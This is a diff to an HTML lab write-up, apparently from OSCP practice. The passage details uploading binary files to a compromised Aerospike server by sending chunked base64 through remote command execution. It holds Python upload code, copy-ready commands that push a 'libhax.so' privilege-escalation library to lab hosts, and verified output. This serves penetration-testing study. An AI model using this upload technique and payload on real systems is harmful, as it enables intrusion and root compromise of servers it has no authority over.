@@ -1021,7 +1021,8 @@ heredoc into a shell argument:</p>
 the only path when no allowlisted port happens to be free.</p>
 <p>Binary payloads cannot ride a shell one-liner, and <code>base64</code> output through <code>io.popen</code> is fine but
 each <code>apply()</code> blocks a server thread. The compromise is <strong>chunked base64 appended to a temp file</strong>,
-with a small chunk size so no single call outlives the client timeout:</p>
+with a small chunk size so no single call outlives the client timeout. The script is
+<a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/poc_aerospike_upload.py"><code>scripts/poc_aerospike_upload.py</code></a>:</p>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">CHUNK</span> <span class="o">=</span> <span class="mi">3000</span>
 <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
 
@@ -1030,12 +1031,29 @@ with a small chunk size so no single call outlives the client timeout:</p>
     <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;printf &#39;%s&#39; &#39;</span><span class="si">{</span><span class="n">b64</span><span class="p">[</span><span class="n">off</span><span class="p">:</span><span class="n">off</span><span class="o">+</span><span class="n">CHUNK</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &gt;&gt; </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;base64 -d </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &gt; </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2"> &amp;&amp; chmod </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2"> &amp;&amp; sha256sum </span><span class="si">{</span><span class="n">remote</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 </pre></div>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.152.143<span class="w"> </span>python3<span class="w"> </span>poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.150.143<span class="w"> </span>python3<span class="w"> </span>poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>--local<span class="w"> </span>/tmp/screen_poc/libhax.so<span class="w"> </span>--remote<span class="w"> </span>/tmp/screenroot/libhax.so<span class="w"> </span>--mode<span class="w"> </span><span class="m">755</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] uploading /tmp/screen_poc/libhax.so (14264 bytes) -&gt; /tmp/screenroot/libhax.so
+[+] local sha256 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775
     sent 19020 b64 chars
-[+] remote: 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screenroot/libhax.so</span></pre></div>
+[+] remote: 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screenroot/libhax.so
+[+] hash match — the file arrived intact</span></pre></div>
+<p><code>AHOST</code> is just the host default — the script reads <code>AHOST</code>/<code>APORT</code>/<code>ANAMESPACE</code>/<code>ASET</code> from the
+environment and also accepts <code>--host</code>/<code>--port</code>. Without it you get the script's built-in default,
+which on a rebuilt box is the wrong address. Re-verified on the <code>192.168.152.143</code> rebuild with a
+20 000-byte random file (seven chunks, mode <code>644</code>):</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span><span class="m">192</span>.168.152.143<span class="w"> </span>python3<span class="w"> </span>poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--local<span class="w"> </span>big.bin<span class="w"> </span>--remote<span class="w"> </span>/tmp/aeroupload_test/big.bin<span class="w"> </span>--mode<span class="w"> </span><span class="m">644</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[+] uploading big.bin (20000 bytes) -&gt; /tmp/aeroupload_test/big.bin
+[+] local sha256 74707cda7f34a441c9f567f1290c63952a97765b2dccc5148e9d3b621abbd63a
+    sent 26668 b64 chars
+[+] remote: 74707cda7f34a441c9f567f1290c63952a97765b2dccc5148e9d3b621abbd63a  /tmp/aeroupload_test/big.bin
+[+] hash match — the file arrived intact</span></pre></div>
+<p>On the target side, both the contents and the mode are what was asked for:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rw-r--r--  1 aero aero 20000 /tmp/aeroupload_test/big.bin
+-rwxr-xr-x  1 aero aero  1068 /tmp/aeroupload_test/small.py</span></pre></div>
 <p>The hash in the response is the whole point: it is computed <strong>on the target</strong>, so a round-trip match
 proves the bytes arrived intact through a channel that was never designed to carry files.</p>
 <blockquote>
